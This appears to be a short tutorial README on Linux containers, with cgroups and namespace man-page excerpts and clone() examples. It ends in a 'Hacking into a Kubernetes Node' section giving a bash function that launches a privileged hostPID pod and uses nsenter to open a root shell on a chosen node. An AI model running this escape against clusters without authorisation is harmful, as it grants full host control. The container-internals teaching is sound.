# Building a container from scratch

## Cgroups

       Control  groups, usually referred to as cgroups, are a Linux kernel feature which allow processes to be organized into hierarchical groups
       whose usage of various types of resources can then be limited and monitored.  The kernel's cgroup interface is provided through a  pseudo-
       filesystem called cgroupfs.  Grouping is implemented in the core cgroup kernel code, while resource tracking and limits are implemented in
       a set of per-resource-type subsystems (memory, CPU, and so on).
---

## Linux Namespces

       A  namespace  wraps  a  global system resource in an abstraction that makes it appear to the processes within the namespace that they have
       their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the
       namespace, but are invisible to other processes.  One use of namespaces is to implement containers.

       Linux provides the following namespaces:

       Namespace   Constant          Isolates
       Cgroup      CLONE_NEWCGROUP   Cgroup root directory
       IPC         CLONE_NEWIPC      System V IPC, POSIX message queues
       Network     CLONE_NEWNET      Network devices, stacks, ports, etc.
       Mount       CLONE_NEWNS       Mount points
       PID         CLONE_NEWPID      Process IDs
       User        CLONE_NEWUSER     User and group IDs
       UTS         CLONE_NEWUTS      Hostname and NIS domain name

---

# Arbitrary code

We use this code to demonstrate the `clone` system call. 
We demonstrate how we are able to spawn new processes with different namespaces defined [here](http://man7.org/linux/man-pages/man2/clone.2.html)

The three examples used in this code snippet are:

---

```bash
  // -----------------------------------------------------------------------------
  // clone() calls
  //
  //int pid = clone(fn, pchild_stack + (1024 * 1024), SIGCHLD, NULL); // Same Pid, Same Disk
  //
  //int pid = clone(fn, pchild_stack + (1024 * 1024), CLONE_NEWPID | SIGCHLD, NULL); // Different Pid, Same Disk
  //
  int pid = clone(fn, pchild_stack + (1024 * 1024), CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWNS | SIGCHLD, NULL); // Different Pid, Different Disk
  //
  // -----------------------------------------------------------------------------
```

It is important to not that `unshare` has similar functionality and features a convenient command line tool.
More information on `unshare` can be found [here](http://man7.org/linux/man-pages/man1/unshare.1.html).

---

# Cgroups

```bash

/sys/fs/cgroup



---

# Hacking into a Kubernetes Node

```bash
function scary () {
  kubectl run scary --restart=Never -t -i \
     --image overridden --overrides \
    '{
      "spec":{
        "hostPID": true,
        "nodeName": "'$1'",
        "containers":[{
          "name":"busybox",
          "image":"alpine",
          "command":[
            "nsenter",
            "--mount=/proc/1/ns/mnt",
            "--","/bin/bash"],
          "stdin": true,
          "tty":true,
          "securityContext":{
            "privileged":true
          }
        }]
      }
    }' --rm --attach
}```